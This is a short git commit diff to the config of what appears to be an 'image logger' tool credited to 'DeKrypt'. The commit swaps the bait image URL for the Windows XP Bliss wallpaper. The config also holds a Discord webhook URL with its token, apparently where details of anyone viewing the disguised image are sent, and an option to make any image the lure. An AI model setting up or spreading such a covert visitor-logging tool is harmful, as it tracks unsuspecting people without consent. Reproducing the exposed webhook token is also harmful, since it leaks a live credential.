cadd81a6065c81743cc69ca9ba7863511c8ff598
noahcairns981-lang <noahcairns981@gmail.com>
2025-09-25 20:18:08 +1200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1420679435711156227/IMp9RCBmpe00eYfWKYYeWKQoGS_OezicJllGI_OfMMcMftiTZLN-HS1dRq7ebVRP0t9y",
-    "image": "https://wallpapercave.com/wp/wp3323186.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-org.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
